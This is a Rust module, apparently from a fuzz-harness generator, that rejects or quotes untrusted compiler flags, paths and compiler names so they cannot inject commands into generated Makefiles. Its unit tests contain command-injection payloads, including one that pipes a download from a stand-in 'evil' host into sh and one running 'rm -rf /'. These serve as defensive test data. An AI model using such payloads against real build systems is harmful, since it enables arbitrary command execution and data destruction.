// SPDX-License-Identifier: Apache-2.0
//! Refuse untrusted build inputs that could inject commands into a
//! generated Makefile recipe.
//!
//! C/C++ harness Makefiles interpolate compile flags, source paths,
//! and include directories straight into `$(CC) ... ` recipe lines.
//! Those strings come from the scanned (untrusted) tree and its
//! `compile_commands.json`. `make` expands `$(...)`/`${...}` and the
//! shell then parses the recipe, so a flag like `-DX=$(shell id)` or
//! a source path containing a backtick/`;`/newline is arbitrary
//! command execution on the analyst's host. We reject any such token
//! before it can reach the template.

use crate::error::HarnessGenError;

/// Characters that have no legitimate place in a compiler flag,
/// include directory, or source path but enable make/shell injection.
/// Whitespace is included because an unquoted space in a recipe
/// splits one token into several arguments.
///
/// On Unix the recipe is parsed by `/bin/sh`. On Windows the recipe is parsed by
/// `cmd.exe` and paths are backslash-separated, contain drive colons, the `\\?\`
/// verbatim prefix (`?`), and parentheses (`C:\Program Files (x86)\...`) — none of
/// which `cmd` treats as operators in argument position. So the Windows set keeps
/// only the genuine `cmd`/`make` injection characters and lets ordinary Windows
/// path characters through. (`make`'s own `$`/`#` stay forbidden on both.)
#[cfg(not(windows))]
const FORBIDDEN: &[char] = &[
    '$', '`', ';', '|', '&', '(', ')', '<', '>', '*', '?', '{', '}', '[', ']', '~', '!', '#', '\'',
    '"', '\\', ' ', '\t', '\n', '\r',
];
#[cfg(windows)]
const FORBIDDEN: &[char] = &[
    '$', '`', ';', '|', '&', '<', '>', '^', '%', '"', '#', ' ', '\t', '\n', '\r',
];

/// True when `value` is safe to interpolate into a Makefile recipe.
pub fn is_build_input_safe(value: &str) -> bool {
    if !value
        .chars()
        .any(|c| c.is_control() || FORBIDDEN.contains(&c))
    {
        return true;
    }
    // A quoted string-macro define is the one common, legitimate use of double
    // quotes — `-DREVISION_ID="lib-1.2.3"`, `-DPACKAGE="my app"` — emitted by CMake
    // (`target_compile_definitions(... NAME="${VAR}")`). The wrapping quotes, and
    // the spaces they protect, are safe; rejecting them blocks the whole project.
    is_quoted_define_safe(value)
}

/// A `-D<NAME>=...="<content>"` define whose ONLY metacharacters are a single
/// balanced pair of wrapping double quotes (and spaces inside them, which the
/// quotes protect from word-splitting). Everything outside the quotes must pass
/// the ordinary check, and the quoted content must still be free of characters
/// that `make`/the shell act on *before* quote parsing — `$` (make/shell
/// expansion), a backtick (command substitution), a backslash (escape), an inner
/// quote, or a newline — so no command injection slips through the relaxation.
fn is_quoted_define_safe(value: &str) -> bool {
    if !value.starts_with("-D") {
        return false;
    }
    if value.matches('"').count() != 2 {
        return false;
    }
    let first = value.find('"').unwrap();
    let last = value.rfind('"').unwrap();
    let before = &value[..first];
    let inside = &value[first + 1..last];
    if !value[last + 1..].is_empty() {
        return false; // trailing junk after the closing quote
    }
    if !is_build_input_safe(before) {
        return false;
    }
    const DANGEROUS_IN_QUOTES: &[char] = &['$', '`', '\\', '"', '\n', '\r'];
    !inside
        .chars()
        .any(|c| c.is_control() || DANGEROUS_IN_QUOTES.contains(&c))
}

/// A token that is not safe BARE but is safe once wrapped in single quotes,
/// rendered with those quotes. `None` when it is unsafe either way, or when it
/// needs no quoting at all (the caller then emits it unchanged).
///
/// `sh` treats every character inside single quotes literally, so the only shell
/// hazard is a single quote itself. `make` expands `$` BEFORE the shell ever sees
/// the line, so that stays forbidden, as do newlines and control characters,
/// which no quoting can contain.
///
/// This is what lets a legitimate CMake define through. `-DLLAMA_VERSIONS=>=3`
/// (gpt4all) and `-D_LIBCPP_HARDENING_MODE=..._DEBUG>` (btop) are ordinary
/// version-comparison defines whose `>` would redirect if emitted bare — refusing
/// them cost every target in those projects, and quoting them is both correct and
/// safe.
pub fn quoted_build_input(value: &str) -> Option<String> {
    if is_build_input_safe(value) {
        return None;
    }
    const UNQUOTABLE: &[char] = &['\'', '$', '\n', '\r'];
    if value.is_empty()
        || value
            .chars()
            .any(|c| c.is_control() || UNQUOTABLE.contains(&c))
    {
        return None;
    }
    Some(format!("'{value}'"))
}

/// Whether a COMPILE FLAG may be interpolated into a recipe — bare or quoted.
///
/// Deliberately narrower than it looks: this relaxation is for flags ONLY. A
/// compile flag appears only inside a recipe command line, where single quotes
/// contain it completely. A source path or include dir also appears as a make
/// TARGET or prerequisite, where quoting does not help and a `;` or `|` breaks
/// rule parsing outright, and an include NAME is interpolated into an
/// `#include "..."` line in generated C. Those stay strict.
pub fn is_compile_flag_usable(value: &str) -> bool {
    is_build_input_safe(value) || quoted_build_input(value).is_some()
}

/// Render a compile flag for a recipe: unchanged when it is safe bare,
/// single-quoted when it needs it. Callers must have validated it first.
pub fn recipe_token(value: &str) -> String {
    quoted_build_input(value).unwrap_or_else(|| value.to_owned())
}

/// Validate every compile flag, permitting one that is safe once quoted.
pub fn ensure_all_compile_flags_safe<'a, I>(values: I) -> Result<(), HarnessGenError>
where
    I: IntoIterator<Item = &'a str>,
{
    for value in values {
        if !is_compile_flag_usable(value) {
            return Err(HarnessGenError::UnsafeBuildInput(format!(
                "refusing to generate harness: compile flag {value:?} contains a shell/make \
                 metacharacter that quoting cannot contain and could inject commands into \
                 the build recipe"
            )));
        }
    }
    Ok(())
}

/// Validate one untrusted build-input token, returning a descriptive
/// `UnsafeBuildInput` error when it contains a metacharacter.
pub fn ensure_build_input_safe(kind: &str, value: &str) -> Result<(), HarnessGenError> {
    if is_build_input_safe(value) {
        return Ok(());
    }
    Err(HarnessGenError::UnsafeBuildInput(format!(
        "refusing to generate harness: {kind} {value:?} contains a shell/make \
         metacharacter and could inject commands into the build recipe"
    )))
}

/// Validate every token in an iterator of untrusted build inputs.
pub fn ensure_all_build_inputs_safe<'a, I>(kind: &str, values: I) -> Result<(), HarnessGenError>
where
    I: IntoIterator<Item = &'a str>,
{
    for value in values {
        ensure_build_input_safe(kind, value)?;
    }
    Ok(())
}

/// Whether `value` is a well-formed C++ standard selector (`c++17`, `gnu++2a`).
///
/// SECURITY: a closed set, not a prefix test. This value is interpolated into the
/// generated Makefile's `CXX_STD` and expanded into a `-std=$(CXX_STD)` recipe that
/// `make` hands to `/bin/sh`, so "starts with `c++`" is not a validation: `c++17; id`
/// starts with `c++` and runs `id`. Only a dialect name reaches the recipe.
///
/// The accepted shape is `c++`/`gnu++` followed by a 2-3 character alphanumeric
/// version whose first character is a digit. That covers every real selector — the
/// year forms (`c++03`, `c++17`, `gnu++20`, `c++23`) and the draft forms
/// (`c++0x`, `c++1y`, `c++2a`, `gnu++2b`) — while admitting no separator, no
/// whitespace and no metacharacter of any kind.
pub fn is_cxx_standard_token(value: &str) -> bool {
    let rest = value
        .strip_prefix("c++")
        .or_else(|| value.strip_prefix("gnu++"));
    let Some(rest) = rest else {
        return false;
    };
    (2..=3).contains(&rest.len())
        && rest.starts_with(|c: char| c.is_ascii_digit())
        && rest
            .chars()
            .all(|c| c.is_ascii_digit() || c.is_ascii_lowercase())
}

/// Whether `value` may be emitted as the generated Makefile's `CC`/`CXX`.
///
/// SECURITY: the compiler token heads every recipe line (`$(CXX) $(CXXFLAGS) …`), so
/// it is the single most powerful injection point in the Makefile. It comes from the
/// scanned tree's `compile_commands.json`, where a "compiler" of
/// `clang++; id > /tmp/x; true` is recognised by a leaf-name check but executes as
/// three shell commands. Hold it to the strict bare-token rule — a compiler path
/// never legitimately needs a metacharacter, and the quoting relaxation that exists
/// for compile FLAGS must not apply here, because `CC`/`CXX` are also expanded in
/// contexts where surrounding quotes would break the command.
pub fn is_compiler_token(value: &str) -> bool {
    !value.trim().is_empty() && is_build_input_safe(value) && !value.starts_with('-')
}

/// Characters allowed in a build-context METADATA value (`BUILD_CONTEXT_PROVENANCE`
/// and friends). These are bhf-generated identifiers reported back to the operator,
/// never compiler arguments.
fn is_metadata_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | ',' | ':' | '+' | '/' | '=' | ' ')
}

/// Render a build-context metadata value for a Makefile variable assignment.
///
/// SECURITY: even a value that is never expanded into a recipe is written as
/// `NAME = <value>`, so a newline in it ends the assignment and everything after it
/// is parsed as Makefile source — enough to define a rule or override a later
/// variable. These values are bhf-generated today; sanitising at the emission
/// boundary means a future producer that forwards a tree-controlled string cannot
/// silently turn that into Makefile injection.
pub fn make_metadata_value(value: &str) -> String {
    let cleaned: String = value
        .chars()
        .map(|c| if is_metadata_char(c) { c } else { '_' })
        .collect();
    if cleaned.trim().is_empty() {
        "none".to_owned()
    } else {
        cleaned
    }
}

/// Validate a value interpolated into a generated GNAT project (`.gpr`) file.
///
/// A `.gpr` is not a shell script, so the Makefile rules do not transfer: `gprbuild`
/// parses it, and the values land INSIDE double-quoted GPR string literals
/// (`for Source_Dirs use ("<dir>")`). Spaces and parentheses are therefore ordinary
/// and must stay legal — a Windows path (`C:\Program Files (x86)\...`) is a normal
/// Ada source dir. What must not get through is anything that ENDS the string
/// literal and lets the remainder parse as GPR source: a double quote, a newline,
/// or a control character.
pub fn is_gpr_string_safe(value: &str) -> bool {
    !value
        .chars()
        .any(|c| c == '"' || c == '\n' || c == '\r' || c.is_control())
}

/// Validate every GPR string value, naming the offending one.
pub fn ensure_all_gpr_strings_safe<'a, I>(kind: &str, values: I) -> Result<(), HarnessGenError>
where
    I: IntoIterator<Item = &'a str>,
{
    for value in values {
        if !is_gpr_string_safe(value) {
            return Err(HarnessGenError::UnsafeBuildInput(format!(
                "refusing to generate harness: {kind} {value:?} contains a quote or newline                  that would terminate its GPR string literal and inject project syntax"
            )));
        }
    }
    Ok(())
}

/// Render a path for interpolation into a generated Makefile recipe / compile
/// command. On Windows this strips the `\\?\` (and `\\?\UNC\`) verbatim prefix
/// and converts `\` to `/`: GNU make runs recipes through `sh`, which eats
/// backslashes, and a drive-letter colon in a target/prerequisite breaks rule
/// parsing — while clang/cl happily accept forward-slash paths (`C:/foo/bar.c`).
/// On other platforms it is the plain display string.
pub fn make_path(p: &std::path::Path) -> String {
    let s = p.display().to_string();
    #[cfg(windows)]
    {
        let stripped = s
            .strip_prefix(r"\\?\UNC\")
            .map(|rest| format!(r"\\{rest}"))
            .or_else(|| s.strip_prefix(r"\\?\").map(str::to_owned))
            .unwrap_or(s);
        return stripped.replace('\\', "/");
    }
    #[cfg(not(windows))]
    {
        s
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cxx_standard_accepts_real_dialect_names() {
        for ok in [
            "c++03", "c++11", "c++14", "c++17", "c++20", "c++23", "c++26", "c++0x", "c++1y",
            "c++1z", "c++2a", "c++2b", "gnu++03", "gnu++11", "gnu++17", "gnu++20", "gnu++2a",
        ] {
            assert!(is_cxx_standard_token(ok), "{ok:?} should be accepted");
        }
    }

    /// GHSA-725h-95qg-44fv: the pre-fix check was `starts_with("c++")`, so every
    /// payload below passed it and reached a `-std=$(CXX_STD)` recipe run by /bin/sh.
    #[test]
    fn cxx_standard_rejects_command_injection() {
        for bad in [
            "c++17; touch ./PWNED; true",
            "c++17; id > ./PWNED.id 2>&1; true",
            "gnu++20 && id",
            "c++17`id`",
            "c++17$(id)",
            "c++17 -DFOO",
            "c++17\nevil:\n\tid",
            "c++",
            "c++1",
            "gnu++",
            "",
            "-std=c++17",
            "clang++",
        ] {
            assert!(!is_cxx_standard_token(bad), "{bad:?} must be rejected");
        }
    }

    #[test]
    fn compiler_token_accepts_ordinary_compilers() {
        for ok in [
            "clang++",
            "/usr/bin/clang++",
            "gcc",
            "/usr/lib/ccache/g++",
            "aarch64-linux-gnu-gcc-12",
        ] {
            assert!(is_compiler_token(ok), "{ok:?} should be accepted");
        }
    }

    /// A compile_commands.json "compiler" heads every recipe line as `$(CXX)`.
    /// The leaf-name recognition upstream accepts these; emission must not.
    #[test]
    fn compiler_token_rejects_command_injection() {
        for bad in [
            "clang++; id > PWNED.id; true",
            "id > /tmp/PWNED.id; clang++",
            "clang++ && id",
            "clang++`id`",
            "clang++$(id)",
            "clang++\nevil:\n\tid",
            "",
            "   ",
        ] {
            assert!(!is_compiler_token(bad), "{bad:?} must be rejected");
        }
    }

    /// Metadata is emitted as `NAME = <value>`; a newline would end the assignment
    /// and let the remainder parse as Makefile source.
    #[test]
    fn metadata_value_neutralizes_makefile_structure() {
        assert_eq!(
            make_metadata_value("exact_tu_compile_database"),
            "exact_tu_compile_database"
        );
        assert_eq!(
            make_metadata_value("output_control,dep_gen"),
            "output_control,dep_gen"
        );
        let injected = make_metadata_value("cmake\n\nevil:\n\tid\n");
        assert!(!injected.contains('\n'), "newline survived: {injected:?}");
        assert!(!injected.contains('\t'), "tab survived: {injected:?}");
        // A space is harmless inside a `NAME = value` assignment and is kept; the
        // make-expansion and command-substitution characters are what must not survive.
        assert_eq!(make_metadata_value("$(shell id)"), "__shell id_");
        assert_eq!(make_metadata_value(""), "none");
    }

    #[test]
    fn accepts_ordinary_flags_and_paths() {
        for ok in [
            "-I/usr/include",
            "-DVERSION=3",
            "-std=gnu++17",
            "/home/user/proj/src/miniz.c",
            "-pthread",
            "--gcc-toolchain=/opt/gcc",
        ] {
            assert!(is_build_input_safe(ok), "{ok:?} should be allowed");
        }
    }

    #[test]
    fn rejects_command_injection_vectors() {
        for bad in [
            "-DX=y$(shell id>/tmp/pwned)",
            "-DX=`id`",
            "src/a;curl evil|sh.c",
            "-DX=y\nrun: ; id",
            "/path/with a space.c",
            "-DX=${HOME}",
        ] {
            assert!(!is_build_input_safe(bad), "{bad:?} should be rejected");
            assert!(ensure_build_input_safe("flag", bad).is_err());
        }
    }

    /// A CMake version-comparison define is legitimate and its `>` would
    /// redirect if emitted bare. Refusing it cost every target in gpt4all and
    /// btop; single-quoting it is correct AND safe, because `sh` treats
    /// everything inside single quotes literally.
    #[test]
    fn a_flag_that_is_safe_once_quoted_is_quoted_not_refused() {
        for flag in [
            "-DLLAMA_VERSIONS=>=3",
            "-D_LIBCPP_HARDENING_MODE=_LIBCPP_HARDENING_MODE_DEBUG>",
            "-DFOO=a|b",
            "-DBAR=(x)",
        ] {
            assert!(!is_build_input_safe(flag), "{flag:?} is not safe bare");
            assert!(is_compile_flag_usable(flag), "{flag:?} must be usable");
            assert_eq!(recipe_token(flag), format!("'{flag}'"));
            assert!(ensure_all_compile_flags_safe([flag]).is_ok());
        }

        // What quoting CANNOT contain is still refused: `make` expands `$`
        // before the shell sees the line, a single quote ends the quoting, and
        // a newline starts a new recipe line.
        for flag in [
            "-DX=y$(shell id)",
            "-DX=${HOME}",
            "-DX='; id; '",
            "-DX=y\nrun: ; id",
        ] {
            assert!(quoted_build_input(flag).is_none(), "{flag:?}");
            assert!(!is_compile_flag_usable(flag), "{flag:?}");
            assert!(ensure_all_compile_flags_safe([flag]).is_err(), "{flag:?}");
        }

        // A safe-bare flag is emitted unchanged — no gratuitous quoting.
        assert_eq!(recipe_token("-DNDEBUG"), "-DNDEBUG");
        assert_eq!(recipe_token("-I/usr/include"), "-I/usr/include");

        // The relaxation is for FLAGS only. A source path is also a make target
        // and an include name lands inside `#include "..."`, so both stay strict
        // even though single-quoting would satisfy the shell.
        for hostile in ["src/a;curl evil|sh.c", "/path/with a space.c"] {
            assert!(ensure_build_input_safe("source path", hostile).is_err());
        }
    }

    #[test]
    fn accepts_well_formed_quoted_string_defines() {
        // CMake `target_compile_definitions(lib NAME="${VAR}")` lands here.
        for ok in [
            "-DREVISION_ID=\"E57Format-3.3.0-x86_64-gcc13\"",
            "-DPACKAGE=\"my app\"", // a space inside the quotes is protected
            "-DGIT_SHA=\"abc123\"",
            "-DPATH_HINT=\"/usr/local/share\"",
        ] {
            assert!(is_build_input_safe(ok), "{ok:?} should be allowed");
        }
    }

    #[test]
    fn rejects_injection_disguised_as_a_quoted_define() {
        for bad in [
            "-DX=\"$(id)\"",         // make/shell expansion inside quotes
            "-DX=\"`id`\"",          // command substitution inside quotes
            "-DX=\"a\";id;\"b\"",    // breaks out with extra quotes/`;`
            "-DX=\"a\\\";id;\\\"\"", // escaped-quote shenanigans
            "-DX=\"a\"; rm -rf /",   // trailing junk after the closing quote
            "-DX=\"a",               // unbalanced quote
            "VERSION=\"3\"",         // not a -D flag
        ] {
            assert!(!is_build_input_safe(bad), "{bad:?} should be rejected");
        }
    }
}
